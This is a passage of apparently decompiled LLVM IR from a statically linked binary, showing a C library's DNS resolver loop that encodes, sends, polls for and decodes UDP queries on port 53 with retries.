  %v2_10013ed8 = add i32 %v0_10013ed8, %v0_10013ed0
  %v1_10013ee0 = add i32 %v2_10013ed8, -1
  %v2_10013ee0 = inttoptr i32 %v1_10013ee0 to i8*
  %v3_10013ee0 = load i8, i8* %v2_10013ee0, align 1
  %v4_10013ee0 = zext i8 %v3_10013ee0 to i32
  store i32 %v4_10013ee0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10033950.538 to i32), i32* @r29, align 4
  %v2_10013ee8 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_10013ee8, i32* %r28.global-to-local, align 4
  %v4_10013ef8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268468572, i32 ptrtoint (i32* @global_var_10033950.538 to i32))
  %v0_10013efc = load i32, i32* @r29, align 4
  store i32 268517124, i32* @lr, align 4
  %v1_10013f00 = call i32 @pthread_mutex_lock(i32 %v0_10013efc)
  %v3_10013f08 = load i32, i32* @global_var_1002f09c.539, align 4
  store i32 %v3_10013f08, i32* %r11.global-to-local, align 4
  %v3_10013f14 = load i16, i16* @global_var_1002eeec.540, align 2
  %v4_10013f14 = zext i16 %v3_10013f14 to i32
  store i32 %v4_10013f14, i32* @r25, align 4
  %v1_10013f18 = load i32, i32* @r23, align 4
  store i32 %v2_10013ee8, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 0, i32* @r17, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* @r18, align 4
  store i32 -1, i32* @r22, align 4
  %v2_10013f18 = srem i32 %v3_10013f08, %v1_10013f18
  %v2_10013f34 = sub i32 %v3_10013f08, %v2_10013f18
  store i32 %v2_10013f34, i32* %r0.global-to-local, align 4
  store i32 %v2_10013f18, i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_10013f40.541 to i32), i32* @lr, align 4
  %v0_10013f3c = call i32 @__pthread_cleanup_pop_restore()
  %v0_10014450.pr19 = load i32, i32* @r18, align 4
  %tmp57 = icmp ult i32 %v0_10014450.pr19, 3
  br i1 %tmp57, label %dec_label_pc_10013f44.lr.ph.lr.ph, label %dec_label_pc_10014468

dec_label_pc_10013f44.lr.ph.lr.ph:                ; preds = %dec_label_pc_10013ec8
  %v2_10013f5c = ptrtoint i32* %stack_var_-144 to i32
  %v2_10014070 = ptrtoint i32* %stack_var_-204 to i32
  %v2_100140d0 = ptrtoint i16* %stack_var_-212 to i32
  %v2_10014114 = ptrtoint i32* %stack_var_-248 to i32
  %v3_10014170 = icmp eq i32 %tmp37, 0
  %v3_1001417c = icmp eq i32 %tmp36, 3
  %v2_100141f8 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_1001424c = ptrtoint i32* %stack_var_-184 to i32
  %v3_10014278 = icmp eq i32 %tmp33, 0
  %v3_100141ec = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_10013f44.lr.ph

dec_label_pc_10013f44:                            ; preds = %dec_label_pc_10013f44.lr.ph, %dec_label_pc_100140f4
  %v0_10013f44 = load i32, i32* @r19, align 4
  %v3_10013f44 = icmp eq i32 %v0_10013f44, -1
  br i1 %v3_10013f44, label %dec_label_pc_10013f54, label %dec_label_pc_10013f4c

dec_label_pc_10013f4c:                            ; preds = %dec_label_pc_10013f44
  store i32 268517204, i32* @lr, align 4
  %v1_10013f50 = call i32 @__libc_close(i32 %v0_10013f44)
  br label %dec_label_pc_10013f54

dec_label_pc_10013f54:                            ; preds = %dec_label_pc_10013f44, %dec_label_pc_10013f4c
  store i32 %v2_10013f5c, i32* @r29, align 4
  %v0_10013f60 = load i32, i32* @r30, align 4
  store i32 268517224, i32* @lr, align 4
  %v3_10013f64 = call i32 @__GI_memset(i32 %v0_10013f60, i32 0, i32 512)
  store i32 268517240, i32* @lr, align 4
  %v3_10013f74 = call i32 @__GI_memset(i32 %v2_10013f5c, i32 0, i32 48)
  %v0_10013f78 = load i32, i32* @r25, align 4
  %v1_10013f78 = add i32 %v0_10013f78, 1
  %v1_10013f7c = urem i32 %v1_10013f78, 65536
  store i32 %v1_10013f7c, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10013f88 = load i32, i32* @r30, align 4
  store i32 %v1_10013f7c, i32* %stack_var_-144, align 4
  %v4_10013f9c = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_10013f88, i32 512)
  store i32 %v4_10013f9c, i32* %r28.global-to-local, align 4
  %v1_10013fa0 = icmp slt i32 %v4_10013f9c, 0
  br i1 %v1_10013fa0, label %dec_label_pc_10014468, label %dec_label_pc_10013fa8

dec_label_pc_10013fa8:                            ; preds = %dec_label_pc_10013f54
  %v0_10013fa8 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10013fa8, i32* @r4, align 4
  %v0_10013fb0 = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r29.global-to-local, align 4
  store i32 268517308, i32* @lr, align 4
  %v4_10013fb8 = call i32 @strncpy(i32 %v0_10013fb0, i32 %v0_10013fa8, i32 1025)
  store i32 ptrtoint (i32* @global_var_1002eef0.422 to i32), i32* %r29.global-to-local, align 4
  %v4_10013fd0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268468572, i32 ptrtoint (i32* @global_var_1002eef0.422 to i32))
  store i32 268517340, i32* @lr, align 4
  %v1_10013fd8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002eef0.422 to i32))
  %v0_10013fdc = load i32, i32* @r22, align 4
  %v1_10013fdc = icmp slt i32 %v0_10013fdc, 0
  %v0_10013fe4 = load i32, i32* @r26, align 4
  %v1_10013fe4 = mul i32 %v0_10013fe4, 4
  store i32 %v1_10013fe4, i32* %r0.global-to-local, align 4
  %v2_10013fe8 = add i32 %v1_10013fe4, %arg4
  %v3_10013fe8 = inttoptr i32 %v2_10013fe8 to i32*
  %v4_10013fe8 = load i32, i32* %v3_10013fe8, align 4
  store i32 %v4_10013fe8, i32* %r29.global-to-local, align 4
  br i1 %v1_10013fdc, label %dec_label_pc_10014030, label %dec_label_pc_10013ff0

dec_label_pc_10013ff0:                            ; preds = %dec_label_pc_10013fa8
  %v3_10013ff4 = load i32, i32* @global_var_1002f0a4.542, align 4
  store i32 %v3_10013ff4, i32* %r0.global-to-local, align 4
  %v2_10013ff8 = icmp slt i32 %v0_10013fdc, %v3_10013ff4
  br i1 %v2_10013ff8, label %dec_label_pc_10014000, label %dec_label_pc_10014030

dec_label_pc_10014000:                            ; preds = %dec_label_pc_10013ff0
  store i32 ptrtoint (i32* @global_var_1001a098.543 to i32), i32* @r4, align 4
  %v0_1001400c = load i32, i32* @r21, align 4
  store i32 268517396, i32* @lr, align 4
  %v4_10014010 = inttoptr i32 %v0_1001400c to i8*
  %v5_10014010 = call i32 @__GI_strncat(i8* %v4_10014010, i32 ptrtoint (i32* @global_var_1001a098.543 to i32), i32 1025, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  %v0_10014018 = load i32, i32* @r22, align 4
  %v1_10014018 = mul i32 %v0_10014018, 4
  store i32 %v1_10014018, i32* %r0.global-to-local, align 4
  %v2_10014020 = add i32 %v1_10014018, ptrtoint (i32* @global_var_10033c1c.544 to i32)
  %v3_10014020 = inttoptr i32 %v2_10014020 to i32*
  %v4_10014020 = load i32, i32* %v3_10014020, align 4
  store i32 %v4_10014020, i32* @r4, align 4
  %v0_10014024 = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10014030.545 to i32), i32* @lr, align 4
  %v4_1001402c = inttoptr i32 %v0_10014024 to i8*
  %v5_1001402c = call i32 @__GI_strncat(i8* %v4_1001402c, i32 %v4_10014020, i32 1025, i32 ptrtoint (i32* @global_var_10033c1c.544 to i32))
  br label %dec_label_pc_10014030

dec_label_pc_10014030:                            ; preds = %dec_label_pc_10013ff0, %dec_label_pc_10013fa8, %dec_label_pc_10014000
  store i32 %v2_10013ee8, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1001403c.546 to i32), i32* @lr, align 4
  %v0_10014038 = call i32 @__pthread_cleanup_pop_restore()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10014044 = load i32, i32* @r30, align 4
  %v1_10014044 = load i32, i32* %r28.global-to-local, align 4
  %v2_10014044 = add i32 %v1_10014044, %v0_10014044
  %v1_10014048 = sub i32 512, %v1_10014044
  %v0_10014050 = load i32, i32* @r21, align 4
  store i32 %v0_10014050, i32* %stack_var_-240, align 4
  store i32 268517468, i32* @lr, align 4
  %v4_10014058 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_10014044, i32 %v1_10014048)
  store i32 %v4_10014058, i32* @r27, align 4
  %v1_1001405c = icmp slt i32 %v4_10014058, 0
  br i1 %v1_1001405c, label %dec_label_pc_10014468, label %dec_label_pc_10014064

dec_label_pc_10014064:                            ; preds = %dec_label_pc_10014030
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1001406c = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268517500, i32* @lr, align 4
  %v3_10014078 = inttoptr i32 %v0_1001406c to i8*
  %v4_10014078 = call i32 @inet_pton(i32 10, i8* %v3_10014078, i32 %v2_10014070)
  %tmp59 = icmp slt i32 %v4_10014078, 1
  br i1 %tmp59, label %dec_label_pc_1001408cthread-pre-split, label %dec_label_pc_10014084

dec_label_pc_10014084:                            ; preds = %dec_label_pc_10014064
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1001408c

dec_label_pc_1001408cthread-pre-split:            ; preds = %dec_label_pc_10014064
  %v3_1001408c.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1001408c

dec_label_pc_1001408c:                            ; preds = %dec_label_pc_1001408cthread-pre-split, %dec_label_pc_10014084
  %v3_1001408c = phi i16 [ %v3_1001408c.pr, %dec_label_pc_1001408cthread-pre-split ], [ 10, %dec_label_pc_10014084 ]
  %v3_10014090 = icmp eq i16 %v3_1001408c, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_10014090, label %dec_label_pc_100140b8, label %dec_label_pc_100140a4

dec_label_pc_100140a4:                            ; preds = %dec_label_pc_1001408c
  %v0_100140a8 = load i32, i32* @r29, align 4
  store i32 268517556, i32* @lr, align 4
  %v1_100140b0 = call i32 @inet_addr(i32 %v0_100140a8)
  %v3_100140b8.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_100140b8

dec_label_pc_100140b8:                            ; preds = %dec_label_pc_1001408c, %dec_label_pc_100140a4
  %v3_100140b8 = phi i16 [ 10, %dec_label_pc_1001408c ], [ %v3_100140b8.pre, %dec_label_pc_100140a4 ]
  %v4_100140b8 = sext i16 %v3_100140b8 to i32
  store i32 268517576, i32* @lr, align 4
  %v3_100140c4 = call i32 @socket(i32 %v4_100140b8, i32 2, i32 17)
  store i32 %v3_100140c4, i32* @r19, align 4
  %v1_100140c8 = icmp slt i32 %v3_100140c4, 0
  br i1 %v1_100140c8, label %dec_label_pc_100140f4, label %dec_label_pc_100140d0

dec_label_pc_100140d0:                            ; preds = %dec_label_pc_100140b8
  store i32 268517596, i32* @lr, align 4
  %v3_100140d8 = call i32 @__libc_connect(i32 %v2_100140d0, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_100140d8, -1
  br i1 %tmp60, label %dec_label_pc_100140fc, label %dec_label_pc_100140e4

dec_label_pc_100140e4:                            ; preds = %dec_label_pc_100140d0
  %v0_100140e4 = call i32 @__errno_location()
  %v1_100140e8 = inttoptr i32 %v0_100140e4 to i32*
  %v2_100140e8 = load i32, i32* %v1_100140e8, align 4
  store i32 %v2_100140e8, i32* %r0.global-to-local, align 4
  %v3_100140ec = icmp eq i32 %v2_100140e8, 101
  br i1 %v3_100140ec, label %dec_label_pc_10014434, label %dec_label_pc_100140f4

dec_label_pc_100140f4:                            ; preds = %dec_label_pc_100140e4, %dec_label_pc_100140b8
  %v0_100140f4 = load i32, i32* @r18, align 4
  %v1_100140f4 = add i32 %v0_100140f4, 1
  store i32 %v1_100140f4, i32* @r18, align 4
  %tmp61 = icmp ult i32 %v1_100140f4, 3
  br i1 %tmp61, label %dec_label_pc_10013f44, label %dec_label_pc_10014468

dec_label_pc_100140fc:                            ; preds = %dec_label_pc_100140d0
  %v0_100140fc = load i32, i32* @r28, align 4
  %v1_100140fc = load i32, i32* @r27, align 4
  %v2_100140fc = add i32 %v1_100140fc, %v0_100140fc
  %v0_10014100 = load i32, i32* @r30, align 4
  %v0_10014108 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_10014110.547 to i32), i32* @lr, align 4
  %v4_1001410c = call i32 @__libc_send(i32 %v0_10014108, i32 %v0_10014100, i32 %v2_100140fc, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10014124 = load i32, i32* @r19, align 4
  store i32 %v0_10014124, i32* %stack_var_-248, align 4
  store i32 268517676, i32* @lr, align 4
  %v3_10014128 = call i32 @__libc_poll(i32 %v2_10014114, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_10014128, 1
  br i1 %tmp62, label %dec_label_pc_10014434, label %dec_label_pc_10014134

dec_label_pc_10014134:                            ; preds = %dec_label_pc_100140fc
  %v0_10014134 = load i32, i32* @r19, align 4
  %v0_10014138 = load i32, i32* @r30, align 4
  store i32 268517704, i32* @lr, align 4
  %v4_10014144 = call i32 @__libc_recv(i32 %v0_10014134, i32 %v0_10014138, i32 512, i32 0)
  store i32 %v4_10014144, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_10014144, 12
  br i1 %tmp63, label %dec_label_pc_100143dc, label %dec_label_pc_10014154

dec_label_pc_10014154:                            ; preds = %dec_label_pc_10014134
  %v0_10014154 = load i32, i32* @r30, align 4
  %v2_1001415c = inttoptr i32 %v0_10014154 to i8*
  %v3_1001415c = call i32 @__decode_header(i8* %v2_1001415c, i32 %v2_10013f5c)
  %v3_10014160 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_10014160, i32* @r20, align 4
  %v1_10014164 = load i32, i32* @r25, align 4
  %v4_10014164 = icmp eq i32 %v3_10014160, %v1_10014164
  br i1 %v4_10014164, label %dec_label_pc_1001416c, label %dec_label_pc_100143dc

dec_label_pc_1001416c:                            ; preds = %dec_label_pc_10014154
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_10014170, label %dec_label_pc_100143dc, label %dec_label_pc_10014178

dec_label_pc_10014178:                            ; preds = %dec_label_pc_1001416c
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_1001417c, label %dec_label_pc_10014184, label %dec_label_pc_100141ec

dec_label_pc_10014184:                            ; preds = %dec_label_pc_10014178
  %v0_10014184 = load i32, i32* @r17, align 4
  %v3_10014184 = icmp eq i32 %v0_10014184, 0
  br i1 %v3_10014184, label %dec_label_pc_1001418c, label %dec_label_pc_100141e0

dec_label_pc_1001418c:                            ; preds = %dec_label_pc_10014184
  store i32 ptrtoint (i32* @global_var_1002eef0.422 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10013ee8, i32* %r28.global-to-local, align 4
  %v4_100141a8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268468572, i32 ptrtoint (i32* @global_var_1002eef0.422 to i32))
  store i32 268517812, i32* @lr, align 4
  %v1_100141b0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002eef0.422 to i32))
  %v3_100141b8 = load i32, i32* @global_var_1002f0a4.542, align 4
  store i32 %v2_10013ee8, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_100141c4 = add i32 %v3_100141b8, -1
  store i32 %v1_100141c4, i32* @r29, align 4
  store i32 268517836, i32* @lr, align 4
  %v0_100141c8 = call i32 @__pthread_cleanup_pop_restore()
  %v0_100141cc = load i32, i32* @r22, align 4
  %v1_100141cc = load i32, i32* @r29, align 4
  %v2_100141cc = icmp slt i32 %v0_100141cc, %v1_100141cc
  br i1 %v2_100141cc, label %dec_label_pc_100141d4, label %dec_label_pc_100141e0

dec_label_pc_100141d4:                            ; preds = %dec_label_pc_1001418c
  %v1_100141d4 = add i32 %v0_100141cc, 1
  store i32 %v1_100141d4, i32* @r22, align 4
  %v0_100141d8 = load i32, i32* @r20, align 4
  store i32 %v0_100141d8, i32* @r25, align 4
  br label %dec_label_pc_10014450thread-pre-split.backedge

dec_label_pc_100141e0:                            ; preds = %dec_label_pc_1001418c, %dec_label_pc_10014184
  %v0_100141e0 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10014214

dec_label_pc_100141ec:                            ; preds = %dec_label_pc_10014178
  br i1 %v3_100141ec, label %dec_label_pc_100141f4, label %dec_label_pc_100143dc

dec_label_pc_100141f4:                            ; preds = %dec_label_pc_100141ec
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_1001420c, label %dec_label_pc_10014200

dec_label_pc_10014200:                            ; preds = %dec_label_pc_100141f4
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_1001422c10 = load i32, i32* @r30, align 4
  store i32 %v0_1001422c10, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001421c

dec_label_pc_1001420c:                            ; preds = %dec_label_pc_100141f4
  %v0_1001420c = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10014214

dec_label_pc_10014214:                            ; preds = %dec_label_pc_100141e0, %dec_label_pc_1001420c
  %storemerge3 = phi i32 [ %v0_1001420c, %dec_label_pc_1001420c ], [ %v0_100141e0, %dec_label_pc_100141e0 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1001420c ], [ 1, %dec_label_pc_100141e0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_10014214 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_10014214, align 4
  br label %dec_label_pc_10014478

dec_label_pc_1001421c:                            ; preds = %dec_label_pc_10014200, %dec_label_pc_1001421c
  %v0_1001422c14 = phi i32 [ %v0_1001422c10, %dec_label_pc_10014200 ], [ %v0_1001422c, %dec_label_pc_1001421c ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_10014200 ], [ %v2_10014220, %dec_label_pc_1001421c ]
  store i32 268517920, i32* @lr, align 4
  %v2_1001421c = call i32 @__length_question(i32 %v0_1001422c14, i32 %storemerge213)
  %v0_10014220 = load i32, i32* %r28.global-to-local, align 4
  %v2_10014220 = add i32 %v0_10014220, %v2_1001421c
  %v0_10014230.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_10014220, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10014220, i32* @r4, align 4
  %v0_1001422c = load i32, i32* @r30, align 4
  store i32 %v0_1001422c, i32* @r3, align 4
  %v2_10014230 = icmp slt i32 %v0_10014230.pr, 1
  %v1_10014234 = add i32 %v0_10014230.pr, 1
  store i32 %v1_10014234, i32* %r29.global-to-local, align 4
  br i1 %v2_10014230, label %dec_label_pc_1001421c, label %dec_label_pc_1001423c

dec_label_pc_1001423c:                            ; preds = %dec_label_pc_1001421c
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_100141f8, label %dec_label_pc_10014388, label %dec_label_pc_10014390

dec_label_pc_1001424c:                            ; preds = %dec_label_pc_10014388
  store i32 %v2_1001424c, i32* %r29.global-to-local, align 4
  %v0_10014250 = load i32, i32* @r30, align 4
  store i32 268517988, i32* @lr, align 4
  %v5_10014260 = call i32 @__decode_answer(i32 %v0_10014250, i32 %v0_10014254, i32 %v1_10014388, i32* nonnull %stack_var_-184)
  store i32 %v5_10014260, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_10014260, -1
  br i1 %tmp64, label %dec_label_pc_10014284, label %dec_label_pc_1001426c

dec_label_pc_1001426c:                            ; preds = %dec_label_pc_1001424c
  %v0_1001426c = load i32, i32* @r24, align 4
  %v3_1001426c = icmp eq i32 %v0_1001426c, 0
  br i1 %v3_1001426c, label %dec_label_pc_100143dc, label %dec_label_pc_10014274

dec_label_pc_10014274:                            ; preds = %dec_label_pc_1001426c
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_10014278, label %dec_label_pc_100143dc, label %dec_label_pc_10014390

dec_label_pc_10014284:                            ; preds = %dec_label_pc_1001424c
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_10014288 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_10014288, label %dec_label_pc_1001432c, label %dec_label_pc_10014290

dec_label_pc_10014290:                            ; preds = %dec_label_pc_10014284
  %v0_10014290 = load i32, i32* @r31, align 4
  store i32 %v2_1001424c, i32* @r4, align 4
  %v1_10014298 = add i32 %v0_10014290, 28
  %v2_10014298 = inttoptr i32 %v1_10014298 to i32*
  %v3_10014298 = load i32, i32* %v2_10014298, align 4
  store i32 %v3_10014298, i32* %r0.global-to-local, align 4
  store i32 %v0_10014290, i32* @r3, align 4
  %v1_100142a0 = add i32 %v0_10014290, 36
  %v2_100142a0 = inttoptr i32 %v1_100142a0 to i32*
  %v3_100142a0 = load i32, i32* %v2_100142a0, align 4
  store i32 %v3_100142a0, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268518072, i32* @lr, align 4
  %v0_100142b4 = call i32 @memcpy()
  %v0_100142b8 = load i32, i32* @r31, align 4
  %v1_100142b8 = add i32 %v0_100142b8, 4
  %v2_100142b8 = inttoptr i32 %v1_100142b8 to i32*
  %v3_100142b8 = load i32, i32* %v2_100142b8, align 4
  %v3_100142bc = icmp eq i32 %v3_100142b8, 24
  br i1 %v3_100142bc, label %dec_label_pc_10014290.dec_label_pc_100142e0_crit_edge, label %dec_label_pc_100142c4

dec_label_pc_10014290.dec_label_pc_100142e0_crit_edge: ; preds = %dec_label_pc_10014290
  %v1_100142e0.pre = load i32, i32* @r16, align 4
  br label %dec_label_pc_100142e0

dec_label_pc_100142c4:                            ; preds = %dec_label_pc_10014290
  %v1_100142c4 = add i32 %v0_100142b8, 28
  %v2_100142c4 = inttoptr i32 %v1_100142c4 to i32*
  %v3_100142c4 = load i32, i32* %v2_100142c4, align 4
  store i32 %v3_100142c4, i32* %r0.global-to-local, align 4
  %v3_100142c8 = icmp eq i32 %v3_100142c4, 0
  br i1 %v3_100142c8, label %dec_label_pc_10014390, label %dec_label_pc_100142d0

dec_label_pc_100142d0:                            ; preds = %dec_label_pc_100142c4
  %v0_100142d0 = load i32, i32* @r16, align 4
  %v3_100142d0 = icmp eq i32 %v0_100142d0, 1
  br i1 %v3_100142d0, label %dec_label_pc_100142e0, label %dec_label_pc_100142d8

dec_label_pc_100142d8:                            ; preds = %dec_label_pc_100142d0
  %v3_100142d8 = icmp eq i32 %v0_100142d0, 28
  br i1 %v3_100142d8, label %dec_label_pc_100142e0, label %dec_label_pc_10014390

dec_label_pc_100142e0:                            ; preds = %dec_label_pc_10014290.dec_label_pc_100142e0_crit_edge, %dec_label_pc_100142d8, %dec_label_pc_100142d0
  %v1_100142e0 = phi i32 [ %v1_100142e0.pre, %dec_label_pc_10014290.dec_label_pc_100142e0_crit_edge ], [ 28, %dec_label_pc_100142d8 ], [ 1, %dec_label_pc_100142d0 ]
  %v4_100142e0 = icmp eq i32 %v3_100142b8, %v1_100142e0
  br i1 %v4_100142e0, label %dec_label_pc_100142f4, label %dec_label_pc_100142e8

dec_label_pc_100142e8:                            ; preds = %dec_label_pc_100142e0
  %v1_100142e8 = inttoptr i32 %v0_100142b8 to i32*
  %v2_100142e8 = load i32, i32* %v1_100142e8, align 4
  store i32 %v2_100142e8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100142f0.550 to i32), i32* @lr, align 4
  %v0_100142ec = call i32 @free()
  br label %dec_label_pc_10014374

dec_label_pc_100142f4:                            ; preds = %dec_label_pc_100142e0
  %v1_100142f8 = add i32 %v0_100142b8, 16
  %v2_100142f8 = inttoptr i32 %v1_100142f8 to i32*
  %v3_100142f8 = load i32, i32* %v2_100142f8, align 4
  store i32 %v3_100142f8, i32* %r11.global-to-local, align 4
  %v0_100142fc = load i32, i32* @r24, align 4
  %v2_100142fc = sub i32 %tmp35, %v0_100142fc
  %v1_10014300 = add i32 %v0_100142b8, 32
  %v2_10014300 = inttoptr i32 %v1_10014300 to i32*
  %v3_10014300 = load i32, i32* %v2_10014300, align 4
  store i32 %v3_10014300, i32* %r0.global-to-local, align 4
  %v1_10014304 = add i32 %v2_100142fc, -1
  %v1_10014308 = add i32 %v3_100142f8, 4
  %v2_1001430c = mul i32 %v1_10014304, %v1_10014308
  store i32 %v2_1001430c, i32* %r11.global-to-local, align 4
  %v2_10014310 = add i32 %v0_100142b8, 36
  %v3_10014310 = inttoptr i32 %v2_10014310 to i32*
  store i32 %v1_10014304, i32* %v3_10014310, align 4
  %v0_10014314 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014314 = load i32, i32* %r0.global-to-local, align 4
  %v3_10014314 = icmp ugt i32 %v0_10014314, %v1_10014314
  br i1 %v3_10014314, label %dec_label_pc_10014390, label %dec_label_pc_1001431c

dec_label_pc_1001431c:                            ; preds = %dec_label_pc_100142f4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10014324 = load i32, i32* @r31, align 4
  %v2_10014324 = add i32 %v1_10014324, 36
  %v3_10014324 = inttoptr i32 %v2_10014324 to i32*
  store i32 0, i32* %v3_10014324, align 4
  br label %dec_label_pc_10014374

dec_label_pc_1001432c:                            ; preds = %dec_label_pc_10014284
  %v3_1001432c = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_1001432c, i32* @r3, align 4
  store i32 268518196, i32* @lr, align 4
  %v0_10014330 = call i32 @free()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_10014338 = load i32, i32* @r16, align 4
  %v4_10014338 = icmp eq i32 %tmp29, %v1_10014338
  br i1 %v4_10014338, label %dec_label_pc_10014340, label %dec_label_pc_10014374

dec_label_pc_10014340:                            ; preds = %dec_label_pc_1001432c
  %v0_10014340 = load i32, i32* @r31, align 4
  %v1_10014340 = add i32 %v0_10014340, 16
  %v2_10014340 = inttoptr i32 %v1_10014340 to i32*
  %v3_10014340 = load i32, i32* %v2_10014340, align 4
  store i32 %v3_10014340, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_10014348 = icmp eq i32 %v3_10014340, %tmp28
  br i1 %v4_10014348, label %dec_label_pc_10014350, label %dec_label_pc_100143d4

dec_label_pc_10014350:                            ; preds = %dec_label_pc_10014340
  %v1_10014350 = add i32 %v0_10014340, 36
  %v2_10014350 = inttoptr i32 %v1_10014350 to i32*
  %v3_10014350 = load i32, i32* %v2_10014350, align 4
  %v1_10014354 = add i32 %v0_10014340, 28
  %v2_10014354 = inttoptr i32 %v1_10014354 to i32*
  %v3_10014354 = load i32, i32* %v2_10014354, align 4
  store i32 %v3_10014354, i32* %r0.global-to-local, align 4
  %v2_10014358 = mul i32 %v3_10014350, %tmp28
  %v2_10014360 = add i32 %v3_10014354, %v2_10014358
  store i32 %v2_10014360, i32* @r3, align 4
  store i32 268518248, i32* @lr, align 4
  %v0_10014364 = call i32 @memcpy()
  %v0_10014368 = load i32, i32* @r31, align 4
  %v1_10014368 = add i32 %v0_10014368, 36
  %v2_10014368 = inttoptr i32 %v1_10014368 to i32*
  %v3_10014368 = load i32, i32* %v2_10014368, align 4
  %v1_1001436c = add i32 %v3_10014368, 1
  store i32 %v1_1001436c, i32* %v2_10014368, align 4
  br label %dec_label_pc_10014374

dec_label_pc_10014374:                            ; preds = %dec_label_pc_1001432c, %dec_label_pc_1001431c, %dec_label_pc_100142e8, %dec_label_pc_10014350
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_10014350 ], [ 0, %dec_label_pc_1001432c ], [ 0, %dec_label_pc_1001431c ], [ %stack_var_-88.118, %dec_label_pc_100142e8 ]
  %v0_10014374 = load i32, i32* @r28, align 4
  %v1_10014374 = load i32, i32* %r15.global-to-local, align 4
  %v2_10014374 = add i32 %v1_10014374, %v0_10014374
  store i32 %v2_10014374, i32* %r28.global-to-local, align 4
  %v0_10014378 = load i32, i32* @r24, align 4
  %v1_10014378 = add i32 %v0_10014378, 1
  store i32 %v1_10014378, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_10014380 = icmp slt i32 %v1_10014378, %tmp35
  br i1 %v2_10014380, label %dec_label_pc_10014388, label %dec_label_pc_10014390

dec_label_pc_10014388:                            ; preds = %dec_label_pc_1001423c, %dec_label_pc_10014374
  %v0_10014254 = phi i32 [ %v2_10014374, %dec_label_pc_10014374 ], [ %v2_10014220, %dec_label_pc_1001423c ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_10014374 ], [ 1, %dec_label_pc_1001423c ]
  %v1_10014388 = load i32, i32* @r27, align 4
  %v2_10014388 = icmp slt i32 %v0_10014254, %v1_10014388
  br i1 %v2_10014388, label %dec_label_pc_1001424c, label %dec_label_pc_10014390

dec_label_pc_10014390:                            ; preds = %dec_label_pc_10014274, %dec_label_pc_1001423c, %dec_label_pc_10014388, %dec_label_pc_100142c4, %dec_label_pc_100142f4, %dec_label_pc_10014374, %dec_label_pc_100142d8
  %v0_10014390 = load i32, i32* @r19, align 4
  store i32 268518296, i32* @lr, align 4
